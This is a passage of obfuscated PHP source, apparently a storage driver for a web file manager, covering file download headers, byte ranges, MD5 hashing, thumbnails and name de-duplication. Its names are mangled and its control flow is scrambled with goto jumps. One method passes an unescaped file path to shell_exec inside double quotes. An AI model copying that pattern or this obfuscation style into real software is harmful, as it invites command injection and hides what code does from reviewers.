$Cô»¾æÒøÄ) { goto AÁ˜»ÜÓºÜ; AÁ˜»ÜÓºÜ: $bèë‘àîÚ¼ = $Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[85]]; $F›ò¶œæÜƒ = $Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[85]]; if (isset($Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[94]])) { $bèë‘àîÚ¼ = $Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[94]][$BŒÏºÇÌÈÕ[85]]; $Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[87]] = $Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[94]][$BŒÏºÇÌÈÕ[87]]; $Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[93]] = $Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[94]][$BŒÏºÇÌÈÕ[93]]; } else { $F›ò¶œæÜƒ = substr($Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[85]], strlen(get_path_father($AÕ•±ÜŒÕ£))); $F›ò¶œæÜƒ = $BŒÏºÇÌÈÕ[18] . ltrim($F›ò¶œæÜƒ, $BŒÏºÇÌÈÕ[18]); } goto c´®ÈŒçÑ; c´®ÈŒçÑ: $d§›æ³ò = array($BŒÏºÇÌÈÕ[85] => $F›ò¶œæÜƒ, $BŒÏºÇÌÈÕ[86] => $Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[86]]); if (isset($Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[87]]) && !$Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[86]]) { $d§›æ³ò[$BŒÏºÇÌÈÕ[87]] = $Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[87]]; } if (isset($Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[93]])) { $d§›æ³ò[$BŒÏºÇÌÈÕ[93]] = $Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[93]]; } goto D¡„õã¢„¦; D¡„õã¢„¦: if (!$Cô»¾æÒøÄ[$BŒÏºÇÌÈÕ[86]]) { $d§›æ³ò[$BŒÏºÇÌÈÕ[95]] = $bèë‘àîÚ¼; } $aÙÙµª‘·Ê[] = $d§›æ³ò; goto A—ì×Ç´†ô; A—ì×Ç´†ô: } return $aÙÙµª‘·Ê; } public function upload($BáËİ´ÂÑ«, $dšëÇ¦—§ä, $F›Òšôô¿Ã = false, $Aâ”°õí“í = REPEAT_REPLACE) { } public function uploadFileByID($d±ŒŠ™—ñ¤, $cˆê½¿°›, $f¸–ç¹áò») { } public function uploadFileByPath($F­¢È±ô“Ÿ, $AĞÅÓ¡×, $fåÖ»ˆ«ºÁ = array()) { } public function isUploadServer() { $c¢‚È½İòÓ =& $_SERVER[¾÷]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $c¢‚È½İòÓ[96]) { return !0; } return $GLOBALS[$c¢‚È½İòÓ[16]][$c¢‚È½İòÓ[97]][$c¢‚È½İòÓ[98]]; } public function isFileOutServer() { $fÓÈê…‹²« =& $_SERVER[¾÷]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $fÓÈê…‹²«[96]) { return !0; } return $GLOBALS[$fÓÈê…‹²«[16]][$fÓÈê…‹²«[97]][$fÓÈê…‹²«[99]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($cİ®á®”¤) { $a¿ŞÛ…‹´× =& $_SERVER[¾÷]; if (!$this->isCdnHost()) { return $cİ®á®”¤; } return str_replace(trim(get_url_root($cİ®á®”¤), $a¿ŞÛ…‹´×[18]), trim($this->cdnHost, $a¿ŞÛ…‹´×[18]), $cİ®á®”¤); } public function uploadLink($fó‘¸¬‘õ‰, $eÃ ğŒØ‡ñ = 0) { goto E£„»Ğ¹—; E®¥œ¦•ºÚ: if ($AÕ›à†åØ‚) { $AÕ›à†åØ‚[$BÕ±Şç‡Ñ[102]] = $fó‘¸¬‘õ‰; $AÕ›à†åØ‚[$BÕ±Şç‡Ñ[103]] = $e…ÕÚš„ãø; } return $AÕ›à†åØ‚; goto Bá¿‘Í¡¾; C’‘°Ò» ‹: $CÁœÑ™’Û = $eÃ ğŒØ‡ñ <= $dª×±†¨ ‚ ? $BÕ±Şç‡Ñ[100] : $BÕ±Şç‡Ñ[101]; $f‡¦±¦ù‡â = (!$eÃ ğŒØ‡ñ ? 1 : ceil($eÃ ğŒØ‡ñ / pow(1024, 3))) * 3600 * 4; $AÕ›à†åØ‚ = $this->{$CÁœÑ™’Û}($fó‘¸¬‘õ‰, $f‡¦±¦ù‡â); goto E®¥œ¦•ºÚ; E£„»Ğ¹—: $BÕ±Şç‡Ñ =& $_SERVER[¾÷]; if ($this->isUploadServer()) { return; } $e…ÕÚš„ãø = $this->getType(); goto C½ÀŠâØÄ; C½ÀŠâØÄ: if (!in_array($e…ÕÚš„ãø, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $dª×±†¨ ‚ = 1024 * 1024 * 10; goto C’‘°Ò» ‹; Bá¿‘Í¡¾: } public function uploadFormData($AÕîáš¨è, $D†˜Æë£½‹ = 3600) { } public function multiUploadFormData($a÷Ü¤¶ë…, $bŸÆ¨á¹‘ = 3600) { } public function download($a‘ÌÜÀÈ°, $B˜†µ÷Îí‹) { } public function ext($B…¥›“íì) { $d’Öêùõí =& $_SERVER[¾÷]; if (strpos($B…¥›“íì, $d’Öêùõí[18]) === -1) { $A¹ğÎ¸ÎàŠ = $B…¥›“íì; } else { $A¹ğÎ¸ÎàŠ = $this->pathThis($B…¥›“íì); } $Eº† ÔŠ½é = $d’Öêùõí[43]; if (strstr($A¹ğÎ¸ÎàŠ, $d’Öêùõí[104])) { $Eº† ÔŠ½é = substr($A¹ğÎ¸ÎàŠ, strrpos($A¹ğÎ¸ÎàŠ, $d’Öêùõí[104]) + 1); $Eº† ÔŠ½é = strtolower($Eº† ÔŠ½é); } if (strlen($Eº† ÔŠ½é) > 3 && preg_match($d’Öêùõí[105], $Eº† ÔŠ½é, $fµ¶¿Ñ†‘­)) { $Eº† ÔŠ½é = $d’Öêùõí[43]; } return $Eº† ÔŠ½é; } public function pathThis($b®©²ÜÍ²) { $D‡ØäÏÍÜÍ =& $_SERVER[¾÷]; $b®©²ÜÍ² = str_replace($D‡ØäÏÍÜÍ[106], $D‡ØäÏÍÜÍ[18], rtrim($b®©²ÜÍ², $D‡ØäÏÍÜÍ[18])); $e˜¥Å”áòî = strrpos($b®©²ÜÍ², $D‡ØäÏÍÜÍ[18]); if ($e˜¥Å”áòî === !1) { return $b®©²ÜÍ²; } return substr($b®©²ÜÍ², $e˜¥Å”áòî + 1); } public function pathFather($DÊ¿òºÀÚß) { $aùÓ¼ÚóĞ =& $_SERVER[¾÷]; $DÊ¿òºÀÚß = str_replace($aùÓ¼ÚóĞ[106], $aùÓ¼ÚóĞ[18], rtrim($DÊ¿òºÀÚß, $aùÓ¼ÚóĞ[18])); $DÕÀïÆòÔÚ = strrpos($DÊ¿òºÀÚß, $aùÓ¼ÚóĞ[18]); if ($DÕÀïÆòÔÚ === !1) { return $aùÓ¼ÚóĞ[43]; } return substr($DÊ¿òºÀÚß, 0, $DÕÀïÆòÔÚ + 1); } public function hashSimple($C’– ¹×‰ƒ) { goto fèõ”İÖ¿å; BĞ³ƒ‘÷„: $E©ƒèĞ¸ ë .= $this->fileSubstr($C’– ¹×‰ƒ, $dÜ¦šæòª - $e¨Ô°À–çÊ, $e¨Ô°À–çÊ); return md5($E©ƒèĞ¸ ë) . $dÜ¦šæòª; goto aâ‰Ó„íÏ; fèõ”İÖ¿å: $eò İÜ•¥¸ =& $_SERVER[¾÷]; if (!$C’– ¹×‰ƒ) { return md5($eò İÜ•¥¸[43]); } $dÜ¦šæòª = $this->size($C’– ¹×‰ƒ); goto CÒ¸¦«°Ìô; b±ù£Œ©·ƒ: $eõ×«±éš = intval($dÜ¦šæòª / $D£½®š³); $E©ƒèĞ¸ ë = $eò İÜ•¥¸[43]; for ($EÂŠ÷îùÇé = 0; $EÂŠ÷îùÇé < $D£½®š³; $EÂŠ÷îùÇé++) { $E©ƒèĞ¸ ë .= $this->fileSubstr($C’– ¹×‰ƒ, $eõ×«±éš * $EÂŠ÷îùÇé, $e¨Ô°À–çÊ); } goto BĞ³ƒ‘÷„; CÒ¸¦«°Ìô: $e¨Ô°À–çÊ = 200; $D£½®š³ = 50; if ($dÜ¦šæòª <= $e¨Ô°À–çÊ * $D£½®š³) { return $this->hashMd5($C’– ¹×‰ƒ) . $dÜ¦šæòª; } goto b±ù£Œ©·ƒ; aâ‰Ó„íÏ: } public static $md5Cache = array(); public function hashMd5($fæà¼î¾Û) { $fæà¼î¾Û = $this->iconvSystem($fæà¼î¾Û); if (isset(self::$md5Cache[$fæà¼î¾Û])) { return self::$md5Cache[$fæà¼î¾Û]; } self::$md5Cache[$fæà¼î¾Û] = $this->hashMd5Shell($fæà¼î¾Û); if (!self::$md5Cache[$fæà¼î¾Û]) { self::$md5Cache[$fæà¼î¾Û] = @md5_file($fæà¼î¾Û); } return self::$md5Cache[$fæà¼î¾Û]; } private function hashMd5Shell($d”Ñ»‰ïø) { goto DØÇÒ³È¼ ; DØÇÒ³È¼ : $Bëä“”‚¬ =& $_SERVER[¾÷]; if (!function_exists($Bëä“”‚¬[107])) { return !1; } $D‚°×Õ¨õç = array($Bëä“”‚¬[108], $Bëä“”‚¬[109]); goto E§‚µÀ’‘; E§‚µÀ’‘: $FöÔøÓ»Ã = Cache::get($Bëä“”‚¬[110]); if (!$FöÔøÓ»Ã) { $CÏí§å‘¨ = BASIC_PATH . $Bëä“”‚¬[111]; $fæ‚Ø…  ´ = md5_file($CÏí§å‘¨); $FöÔøÓ»Ã = $Bëä“”‚¬[112]; foreach ($D‚°×Õ¨õç as $f¿×ªÑß÷¡) { $b¯ëŠáË = shell_exec($f¿×ªÑß÷¡ . "\x20\x22{$CÏí§å‘¨}\x22"); if ($b¯ëŠáË && substr(trim($b¯ëŠáË), 0, 32) == $fæ‚Ø…  ´) { $FöÔøÓ»Ã = $f¿×ªÑß÷¡; break; } } Cache::set($Bëä“”‚¬[110], $FöÔøÓ»Ã, 3600); } if ($FöÔøÓ»Ã == $Bëä“”‚¬[112]) { return !1; } goto Eá½Ñ…Ÿ¨º; Eá½Ñ…Ÿ¨º: $b¯ëŠáË = shell_exec($FöÔøÓ»Ã . "\x20\42{$d”Ñ»‰ïø}\x22"); $b¯ëŠáË = str_replace($Bëä“”‚¬[113], $Bëä“”‚¬[43], $b¯ëŠáË); return substr($b¯ëŠáË, 0, 32); goto bğÍ‘åÁ¢‘; bğÍ‘åÁ¢‘: } public function link($fÎ†ãˆÔ«’) { return $fÎ†ãˆÔ«’; } public function fileOut($bØ‰çƒÄ®Ì, $A™ñŒàÍ˜İ = false, $b–š—í¾í½ = false, $AßÅÍºòÕ´ = '') { goto E¯´®–¦¬İ; c˜…‡‚”±: if ($cíš“ôÅØ) { $eç‡Æ÷ÛÉÉ = intval(1000 * 1000 * ($fóƒÏ’†¢Õ / $cíš“ôÅØ)); } while ($aí¿‰³‡­‡ <= $cÁÕ¢ˆÎ‚) { $D‡ÑŠ¿±ß = timeFloat(); check_abort(); $Fˆ™“¼ = $cÁÕ¢ˆÎ‚ - $aí¿‰³‡­‡ + 1; if ($Fˆ™“¼ <= $fóƒÏ’†¢Õ) { $fóƒÏ’†¢Õ = $Fˆ™“¼; } echo $this->fileSubstr($bØ‰çƒÄ®Ì, $aí¿‰³‡­‡, $fóƒÏ’†¢Õ); $aí¿‰³‡­‡ += $fóƒÏ’†¢Õ; if ($fóƒÏ’†¢Õ == $Fˆ™“¼) { $aí¿‰³‡­‡ = $cÁÕ¢ˆÎ‚ + 1; } if ($eç‡Æ÷ÛÉÉ) { $E¶áœŠºÛ = intval(1000 * 1000 * (timeFloat() - $D‡ÑŠ¿±ß)); $B¸ŠøÕ¾Ì™ = $eç‡Æ÷ÛÉÉ - $E¶áœŠºÛ; if ($B¸ŠøÕ¾Ì™ > 5) { usleep($B¸ŠøÕ¾Ì™); } } } goto Fë–è™¤ë¼; aÙ¶†êÔïğ: $cÜ×å £› = strtolower($_SERVER[$B¢¬ÇÍ†Û[151]]); if ($c°ÃµãŒ && $cÜ×å £› && $A…Ô©òò¡‡) { if (strstr($cÜ×å £›, $B¢¬ÇÍ†Û[152])) { header($B¢¬ÇÍ†Û[153] . $bØ‰çƒÄ®Ì); } else { if (strstr($cÜ×å £›, $B¢¬ÇÍ†Û[154])) { header($B¢¬ÇÍ†Û[155] . $bØ‰çƒÄ®Ì); } else { if (strstr($cÜ×å £›, $B¢¬ÇÍ†Û[156])) { header($B¢¬ÇÍ†Û[157] . $bØ‰çƒÄ®Ì); } } } if ($cíš“ôÅØ) { header($B¢¬ÇÍ†Û[158] . $cíš“ôÅØ); } return; } if (isset($_SERVER[$B¢¬ÇÍ†Û[159]])) { if (preg_match($B¢¬ÇÍ†Û[160], $_SERVER[$B¢¬ÇÍ†Û[159]], $F›¾®åÓ®)) { $aí¿‰³‡­‡ = intval($F›¾®åÓ®[1]); if (!empty($F›¾®åÓ®[2])) { $cÁÕ¢ˆÎ‚ = intval($F›¾®åÓ®[2]); } } header($B¢¬ÇÍ†Û[161]); header("\103\157\x6e\164\x65\x6e\x74\55\122\x61\x6e\147\145\x3a\x20\x62\x79\x74\145\x73\40{$aí¿‰³‡­‡}\x2d{$cÁÕ¢ˆÎ‚}\x2f" . $a¼†Š¾Ù™•); } else { header($B¢¬ÇÍ†Û[162]); } goto f×Äî‚‡Ò; E¢¸‘Êåå: if (in_array($dª¸ÅøÂĞ, array($B¢¬ÇÍ†Û[120], $B¢¬ÇÍ†Û[121], $B¢¬ÇÍ†Û[122], $B¢¬ÇÍ†Û[123]))) { $dª¸ÅøÂĞ = $B¢¬ÇÍ†Û[124]; } if (!$AßÅÍºòÕ´) { $AßÅÍºòÕ´ = md5($A”‹¥ğ¢Ú . $this->hashSimple($bØ‰çƒÄ®Ì)); } $AßÅÍºòÕ´ = $B¢¬ÇÍ†Û[125] . $AßÅÍºòÕ´ . $B¢¬ÇÍ†Û[125]; goto aœ·±Û×›¡; aò–•ĞéÆ‡: header($B¢¬ÇÍ†Û[137]); header($B¢¬ÇÍ†Û[138]); header($B¢¬ÇÍ†Û[139]); goto bŠëÍˆ÷à; FÈ¥É“÷êÕ: $aí¿‰³‡­‡ = 0; $cÁÕ¢ˆÎ‚ = $a¼†Š¾Ù™• - 1; $dª¸ÅøÂĞ = $this->ext($Fƒ½ëÓöĞ…); goto E¢¸‘Êåå; aœ·±Û×›¡: $FÁßŒ ßì = get_file_mime($dª¸ÅøÂĞ); if (strstr($FÁßŒ ßì, $B¢¬ÇÍ†Û[126])) { $FÁßŒ ßì = $FÁßŒ ßì . $B¢¬ÇÍ†Û[127]; } if ($A™ñŒàÍ˜İ === !1 && !mime_support($FÁßŒ ßì)) { $A™ñŒàÍ˜İ = !0; $FÁßŒ ßì = $B¢¬ÇÍ†Û[128]; } goto FˆÈ¸‹ŒÌ–; E¯´®–¦¬İ: $B¢¬ÇÍ†Û =& $_SERVER[¾÷]; $this->cacheMethod(null, null); if (!$bØ‰çƒÄ®Ì || !$this->exist($bØ‰çƒÄ®Ì)) { show_json(LNG($B¢¬ÇÍ†Û[114]), !1, $b–š—í¾í½); } goto Bäâ„Ş¹ Ù; bŠëÍˆ÷à: if (isset($_SERVER[$B¢¬ÇÍ†Û[140]]) && strtotime($_SERVER[$B¢¬ÇÍ†Û[140]]) == $BÆ£Ä†ŠìÈ[$B¢¬ÇÍ†Û[93]]) { header($B¢¬ÇÍ†Û[141], !0, 304); die; } if (isset($_SERVER[$B¢¬ÇÍ†Û[142]]) && $_SERVER[$B¢¬ÇÍ†Û[142]] == $AßÅÍºòÕ´) { header($B¢¬ÇÍ†Û[143] . $AßÅÍºòÕ´, !0, 304); die; } header($B¢¬ÇÍ†Û[143] . $AßÅÍºòÕ´); goto c¦“İÅ»ŠÁ; A£×¬ŒÜÑ: $E‡Æ„çåÑ½ = $B¢¬ÇÍ†Û[125] . $E‡Æ„çåÑ½ . $B¢¬ÇÍ†Û[131] . $E‡Æ„çåÑ½; if ($A™ñŒàÍ˜İ) { header($B¢¬ÇÍ†Û[132]); header($B¢¬ÇÍ†Û[133] . $E‡Æ„çåÑ½); } else { header($B¢¬ÇÍ†Û[134] . $E‡Æ„çåÑ½); } header($B¢¬ÇÍ†Û[135] . gmdate($B¢¬ÇÍ†Û[119], time() + 3600 * 24 * 30) . $B¢¬ÇÍ†Û[136]); goto aò–•ĞéÆ‡; b«å‚‘„»·: @ob_end_clean(); set_timeout(); $BÆ£Ä†ŠìÈ = $this->infoFull($bØ‰çƒÄ®Ì); goto c´×Ë‘îĞŠ; CĞñéƒË½‡: header($B¢¬ÇÍ†Û[147] . $a¼†Š¾Ù™•); header($B¢¬ÇÍ†Û[148]); if (!$A™ñŒàÍ˜İ && $dª¸ÅøÂĞ == $B¢¬ÇÍ†Û[149]) { if ($a¼†Š¾Ù™• > 1024 * 1024 * 5) { die; } $CÉ¨Š¶ŞÌ¹ = $this->getContent($bØ‰çƒÄ®Ì); $CÉ¨Š¶ŞÌ¹ = Html::clearSVG($CÉ¨Š¶ŞÌ¹); header($B¢¬ÇÍ†Û[150] . strlen($CÉ¨Š¶ŞÌ¹)); echo $CÉ¨Š¶ŞÌ¹; die; } goto aÙ¶†êÔïğ; Bäâ„Ş¹ Ù: $c°ÃµãŒ = $this->getType() == $B¢¬ÇÍ†Û[115]; $A…Ô©òò¡‡ = $GLOBALS[$B¢¬ÇÍ†Û[16]][$B¢¬ÇÍ†Û[97]][$B¢¬ÇÍ†Û[116]][$B¢¬ÇÍ†Û[117]]; $cíš“ôÅØ = (double) $GLOBALS[$B¢¬ÇÍ†Û[16]][$B¢¬ÇÍ†Û[97]][$B¢¬ÇÍ†Û[116]][$B¢¬ÇÍ†Û[118]] * 1024 * 1024; goto b«å‚‘„»·; c¦“İÅ»ŠÁ: header($B¢¬ÇÍ†Û[144] . $A”‹¥ğ¢Ú . $B¢¬ÇÍ†Û[136]); header($B¢¬ÇÍ†Û[145] . $Fƒ½ëÓöĞ…); header($B¢¬ÇÍ†Û[146]); goto CĞñéƒË½‡; FˆÈ¸‹ŒÌ–: header($B¢¬ÇÍ†Û[129]); header($B¢¬ÇÍ†Û[130] . $FÁßŒ ßì); $E‡Æ„çåÑ½ = rawurlencode($Fƒ½ëÓöĞ…); goto A£×¬ŒÜÑ; c´×Ë‘îĞŠ: $a¼†Š¾Ù™• = $BÆ£Ä†ŠìÈ[$B¢¬ÇÍ†Û[87]]; $A”‹¥ğ¢Ú = gmdate($B¢¬ÇÍ†Û[119], $BÆ£Ä†ŠìÈ[$B¢¬ÇÍ†Û[93]]); $Fƒ½ëÓöĞ… = $b–š—í¾í½ ? $b–š—í¾í½ : $this->iconvApp($BÆ£Ä†ŠìÈ[$B¢¬ÇÍ†Û[38]]); goto FÈ¥É“÷êÕ; f×Äî‚‡Ò: $a‰¹‘ïêˆÛ = !0; if ($_SERVER[$B¢¬ÇÍ†Û[163]] == $B¢¬ÇÍ†Û[164] && $a¼†Š¾Ù™• > 1204 * 1024 * 1024 * 2) { $a‰¹‘ïêˆÛ = !1; } if ($a‰¹‘ïêˆÛ) { header($B¢¬ÇÍ†Û[165] . ($cÁÕ¢ˆÎ‚ - $aí¿‰³‡­‡ + 1)); } goto D™Êë¾ç• ; D™Êë¾ç• : if ($_SERVER[$B¢¬ÇÍ†Û[166]] == $B¢¬ÇÍ†Û[167]) { return; } $fóƒÏ’†¢Õ = 1024 * 100; $eç‡Æ÷ÛÉÉ = 0; goto c˜…‡‚”±; Fë–è™¤ë¼: } public function fileOutServer($dŠÕöªïÓæ, $a¯¦Š´…²‹ = false, $dÆİµ¬ÆÔ¶ = false, $b¹´ÀÎãĞ = '') { $this->fileOut($dŠÕöªïÓæ, $a¯¦Š´…²‹, $dÆİµ¬ÆÔ¶, $b¹´ÀÎãĞ); } public function fileOutLink($d¡ùŠ§•í) { header($_SERVER[¾÷][168] . $d¡ùŠ§•í); die; } public function cacheMethod($a‘ä‘Í®¾, $B‘­á†×», $DåĞæˆ‘ˆì = null) { goto dÀ×õó¦µ¬; DßÎ°¥¨¿¡: if (!is_null($DåĞæˆ‘ˆì)) { $CªÔ‰…é÷°[$E¨Ô¼ìä½ô] = $DåĞæˆ‘ˆì; return; } $eŸ‡İ†Òõß = isset($CªÔ‰…é÷°[$E¨Ô¼ìä½ô]) ? $CªÔ‰…é÷°[$E¨Ô¼ìä½ô] : null; if (!is_null($eŸ‡İ†Òõß)) { return $eŸ‡İ†Òõß; } goto Eó‡Õ¼»ğ²; Bó¶Û‘Œñ: $E¨Ô¼ìä½ô = $BâÑùáµÎ½[169] . $a‘ä‘Í®¾ . $BâÑùáµÎ½[170] . rtrim($B·‚¼ ç†Œ, $BâÑùáµÎ½[18]); if (is_null($a‘ä‘Í®¾)) { $CªÔ‰…é÷° = array(); return; } if (is_null($B‘­á†×»)) { unset($CªÔ‰…é÷°[$E¨Ô¼ìä½ô]); return; } goto DßÎ°¥¨¿¡; dÀ×õó¦µ¬: $BâÑùáµÎ½ =& $_SERVER[¾÷]; static $CªÔ‰…é÷° = array(); $B·‚¼ ç†Œ = $B‘­á†×» ? ltrim($this->getPathOuter($B‘­á†×»), $BâÑùáµÎ½[18]) : $B‘­á†×»; goto Bó¶Û‘Œñ; Eó‡Õ¼»ğ²: $eŸ‡İ†Òõß = $this->{$a‘ä‘Í®¾}($B‘­á†×»); $CªÔ‰…é÷°[$E¨Ô¼ìä½ô] = $eŸ‡İ†Òõß; return $eŸ‡İ†Òõß; goto FÈÜÑ­¹’Ä; FÈÜÑ­¹’Ä: } public function fileOutImage($EÙ‘——¶Áä, $e˜…Âé…Ù‚ = 250) { goto AÍÕ“Í©°Ó; AÚÇÅè÷ À: if ($CÜåµô¢„[$FŠ’ç¨ˆÖ[87]] <= 1024 * 50 || $FÚ×·ØğÔ‰ || !function_exists($FŠ’ç¨ˆÖ[176]) || $CÜåµô¢„[$FŠ’ç¨ˆÖ[177]] == $FŠ’ç¨ˆÖ[178]) { return $this->fileOut($EÙ‘——¶Áä, !1, $d“¥°Û»); } if (isset($CÜåµô¢„[$FŠ’ç¨ˆÖ[173]][$FŠ’ç¨ˆÖ[179]])) { $C–Ø¼¦‹™ = $CÜåµô¢„[$FŠ’ç¨ˆÖ[173]][$FŠ’ç¨ˆÖ[179]]; } else { if (isset($CÜåµô¢„[$FŠ’ç¨ˆÖ[173]][$FŠ’ç¨ˆÖ[180]])) { $C–Ø¼¦‹™ = $CÜåµô¢„[$FŠ’ç¨ˆÖ[173]][$FŠ’ç¨ˆÖ[180]]; } else { $C–Ø¼¦‹™ = md5("{$CÜåµô¢„[$FŠ’ç¨ˆÖ[38]]}\137{$CÜåµô¢„[$FŠ’ç¨ˆÖ[85]]}\137{$CÜåµô¢„[$FŠ’ç¨ˆÖ[87]]}"); } } $aââÁëÄ = "{$C–Ø¼¦‹™}\137{$e˜…Âé…Ù‚}\x2e\160\x6e\x67"; goto d¿†Åõ•£Ì; b“‚öÒÈ: $d“¥°Û» = $CÜåµô¢„[$FŠ’ç¨ˆÖ[38]]; $FÚ×·ØğÔ‰ = !1; if (isset($GLOBALS[$FŠ’ç¨ˆÖ[171]]) && $GLOBALS[$FŠ’ç¨ˆÖ[171]][$FŠ’ç¨ˆÖ[85]] == $CÜåµô¢„[$FŠ’ç¨ˆÖ[85]]) { $cä±×½²î = $GLOBALS[$FŠ’ç¨ˆÖ[171]][$FŠ’ç¨ˆÖ[172]]; if (!$CÜåµô¢„[$FŠ’ç¨ˆÖ[173]]) { $CÜåµô¢„[$FŠ’ç¨ˆÖ[173]] = $GLOBALS[$FŠ’ç¨ˆÖ[171]]; } if (isset($cä±×½²î[$FŠ’ç¨ˆÖ[174]])) { if ($cä±×½²î[$FŠ’ç¨ˆÖ[174]] <= $e˜…Âé…Ù‚ && $cä±×½²î[$FŠ’ç¨ˆÖ[175]] <= $e˜…Âé…Ù‚) { $FÚ×·ØğÔ‰ = !0; } } $d“¥°Û» = $CÜåµô¢„[$FŠ’ç¨ˆÖ[173]][$FŠ’ç¨ˆÖ[38]]; } goto AÚÇÅè÷ À; AÍÕ“Í©°Ó: $FŠ’ç¨ˆÖ =& $_SERVER[¾÷]; if (substr($EÙ‘——¶Áä, 0, 4) == $FŠ’ç¨ˆÖ[156]) { $this->fileOutLink($EÙ‘——¶Áä); } $CÜåµô¢„ = $this->info($EÙ‘——¶Áä); goto b“‚öÒÈ; aÊ•Œ½—Ü: if (!file_exists($C‘ÂÀ×Ôòõ) || filesize($C‘ÂÀ×Ôòõ) < 100) { return @file_exists($BÀ£ƒñ×ŸÓ) ? IO::fileOut($BÀ£ƒñ×ŸÓ) : $this->fileOut($EÙ‘——¶Áä); } if (!($AÊ”Ô†ì = IO::move($C‘ÂÀ×Ôòõ, $aéƒÈ‡«Õ¢))) { return IO::fileOut($C‘ÂÀ×Ôòõ); } del_file($C‘ÂÀ×Ôòõ); goto D¸çëˆ± Ÿ; D¸çëˆ± Ÿ: IO::fileOut($AÊ”Ô†ì); goto d®İÃô§²Ì; BÚìËÒ¸: $C‘ÂÀ×Ôòõ = DATA_THUMB . $aââÁëÄ; del_file($C‘ÂÀ×Ôòõ); if (!@file_exists($C‘ÂÀ×Ôòõ)) { $a”‚Ê¦ÀàÙ = TEMP_FILES; if (!is_dir($a”‚Ê¦ÀàÙ)) { mk_dir($a”‚Ê¦ÀàÙ); } $BÀ£ƒñ×ŸÓ = $a”‚Ê¦ÀàÙ . $C–Ø¼¦‹™ . $FŠ’ç¨ˆÖ[104] . $CÜåµô¢„[$FŠ’ç¨ˆÖ[177]]; if (!@file_exists($BÀ£ƒñ×ŸÓ)) { $BÀ£ƒñ×ŸÓ = $this->download($EÙ‘——¶Áä, $BÀ£ƒñ×ŸÓ); } ImageThumb::createThumb($BÀ£ƒñ×ŸÓ, $C‘ÂÀ×Ôòõ, $e˜…Âé…Ù‚, $e˜…Âé…Ù‚ * 10); } goto aÊ•Œ½—Ü; d¿†Åõ•£Ì: if (!($fĞÃë¼Ë¡¢ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $FŠ’ç¨ˆÖ[181]))) { $aéƒÈ‡«Õ¢ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $FŠ’ç¨ˆÖ[182]); } else { $aéƒÈ‡«Õ¢ = KodIO::make($fĞÃë¼Ë¡¢); } if ($fĞÃë¼Ë¡¢ = IO::fileNameExist($aéƒÈ‡«Õ¢, $aââÁëÄ)) { $C‘ÂÀ×Ôòõ = KodIO::make($fĞÃë¼Ë¡¢); return IO::fileOut($C‘ÂÀ×Ôòõ, !1, $d“¥°Û»); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto BÚìËÒ¸; d®İÃô§²Ì: } public function fileOutImageServer($BÜëæç©¡¾, $bäªæÆ÷´Ñ = 250) { $this->fileOutImage($BÜëæç©¡¾, $bäªæÆ÷´Ñ); } public function fileNameAuto($FÂç‘ÈÂÉÎ, $eÖÄºö‘, $CøÇù±‰’ = REPEAT_RENAME, $eõ¶Çğ‹ìã = false) { goto e“‹Ï ÷; e˜ëï½²Ñ‡: if ($CøÇù±‰’ == REPEAT_SKIP) { return !1; } $aö±Œƒîªš = $E­ˆ©øÑå«[104] . get_path_ext($eÖÄºö‘); $aö±Œƒîªš = $aö±Œƒîªš == $E­ˆ©øÑå«[104] || $eõ¶Çğ‹ìã ? $E­ˆ©øÑå«[43] : $aö±Œƒîªš; goto añ Ü‚ãø; añ Ü‚ãø: $Càî©œŒ¸Ú = 1; $fìÈÅ©Ø‡Š = substr($eÖÄºö‘, 0, strlen($eÖÄºö‘) - strlen($aö±Œƒîªš)); $D×„‹¶Ê = $fìÈÅ©Ø‡Š . "\50{$Càî©œŒ¸Ú}\x29{$aö±Œƒîªš}"; goto eàŒ¬ôÕíæ; e“‹Ï ÷: $E­ˆ©øÑå« =& $_SERVER[¾÷]; $F½ˆ‹ïóÌ = $FÂç‘ÈÂÉÎ === $E­ˆ©øÑå«[43] ? $eÖÄºö‘ : rtrim($FÂç‘ÈÂÉÎ, $E­ˆ©øÑå«[18]) . $E­ˆ©øÑå«[18] . $eÖÄºö‘; if ($CøÇù±‰’ == REPEAT_REPLACE || !$this->exist($F½ˆ‹ïóÌ) || $eõ¶Çğ‹ìã && $CøÇù±‰’ != REPEAT_RENAME_FOLDER) { return $eÖÄºö‘; } goto e˜ëï½²Ñ‡; eàŒ¬ôÕíæ: while ($this->exist(rtrim($FÂç‘ÈÂÉÎ, $E­ˆ©øÑå«[18]) . $E­ˆ©øÑå«[18] . $D×„‹¶Ê)) { $D×„‹¶Ê = $fìÈÅ©Ø‡Š . "\50{$Càî©œŒ¸Ú}\x29{$aö±Œƒîªš}"; $Càî©œŒ¸Ú++; } return $D×„‹¶Ê; goto DÉŒ¯‰Õóô; DÉŒ¯‰Õóô: } private function fileNameAutoList($CÅÓĞªè, $dµØŸºò¶œ, $Få†Ïµ“¾¼ = false) { goto c©¶§…İ¿; eÙô³ÕŒéÈ: $F¼¿Áå = substr($dµØŸºò¶œ, 0, strlen($dµØŸºò¶œ) - strlen($EÏÖ¬¦ÃÉ¦)); $F¬¹œÖ‚ç = $F¼¿Áå . "\x28\60\x29{$EÏÖ¬¦ÃÉ¦}"; for ($cßµßÛÆ¨¦ = 1; $cßµßÛÆ¨¦ <= count($E»‘ì…ê‹ñ) + 1; $cßµßÛÆ¨¦++) { $F¬¹œÖ‚ç = $F¼¿Áå . 